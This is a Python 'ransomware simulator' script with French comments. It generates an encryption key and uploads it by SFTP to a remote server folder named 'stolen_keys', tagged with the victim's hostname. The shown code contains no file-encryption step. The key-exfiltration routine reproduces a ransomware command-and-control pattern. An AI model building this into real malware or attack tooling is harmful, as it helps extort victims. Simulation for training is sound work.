import logging
import os
import socket
import subprocess
import sys
import time
import paramiko
from cryptography.fernet import Fernet

# Configuration initiale
LOG_FILE = "/var/log/ransomware_sim.log"
SSH_KEY_PATH = "/tmp/encryption_key.key"

# Initialisation du logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class RansomwareSimulator:
    def __init__(self):
        self.fernet = None
        self.key = None
        self.ssh_config = {
            'server': None,
            'port': 22,
            'user': None,
            'password': None
        }

    def check_root(self):
        """Vérifie les privilèges root"""
        if os.geteuid() != 0:
            logging.error("Le script doit être exécuté en tant que root!")
            sys.exit(1)

    def generate_key(self):
        """Génère une clé de chiffrement Fernet"""
        try:
            self.key = Fernet.generate_key()
            with open(SSH_KEY_PATH, "wb") as key_file:
                key_file.write(self.key)
            self.fernet = Fernet(self.key)
            logging.info(f"Clé générée: {SSH_KEY_PATH}")
            print(f"\n[+] Clé générée: {SSH_KEY_PATH}")
            return True
        except Exception as e:
            logging.error(f"Erreur génération clé: {str(e)}")
            return False

    def configure_ssh(self):
        """Configure les paramètres SSH"""
        print("\n[ Configuration SSH ]")
        self.ssh_config['server'] = input("IP du serveur SSH: ").strip()
        self.ssh_config['user'] = input("Utilisateur SSH: ").strip()
        self.ssh_config['password'] = input("Mot de passe SSH: ").strip()
        port = input("Port SSH [22]: ").strip()
        self.ssh_config['port'] = int(port) if port else 22

    def send_key_via_ssh(self):
        """Transmet la clé via SSH"""
        if not self.key:
            print("\n[!] Générer d'abord une clé")
            return False

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                self.ssh_config['server'],
                port=self.ssh_config['port'],
                username=self.ssh_config['user'],
                password=self.ssh_config['password']
            )
            sftp = ssh.open_sftp()

            remote_dir = f"/home/{self.ssh_config['user']}/stolen_keys"
            try:
                sftp.mkdir(remote_dir)
            except IOError:
                pass

            remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
            sftp.put(SSH_KEY_PATH, remote_path)
            sftp.close()
            ssh.close()

            logging.info(f"Clé envoyée à {self.ssh_config['server']}:{remote_path}")
            print(f"\n[+] Clé envoyée à {self.ssh_config['server']}")
            return True
        except Exception as e:
            logging.error(f"Échec SSH: {str(e)}")
            print(f"\n[!] Échec envoi: {str(e)}")
            return False

    def show_menu(self):
        """Affiche le menu principal"""
        while True:
            print("\n" + "="*50)
            print(" RANSOMWARE SIMULATEUR - MENU PRINCIPAL")
            print("="*50)
            print("1. Générer une clé de chiffrement")
            print("2. Configurer le serveur SSH")
            print("3. Envoyer la clé via SSH")
            print("0. Quitter")
            print("="*50)

            choice = input("\nVotre choix: ").strip()

            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.configure_ssh()
            elif choice == "3":
                self.send_key_via_ssh()
            elif choice == "0":
                print("\n[+] Fermeture du programme.")
                sys.exit(0)
            else:
                print("\n[!] Choix invalide")

def main():
    """Fonction principale"""
    simulator = RansomwareSimulator()
    simulator.check_root()
    logging.info("=== Démarrage du simulateur ===")
    simulator.show_menu()

if __name__ == "__main__":
    main()
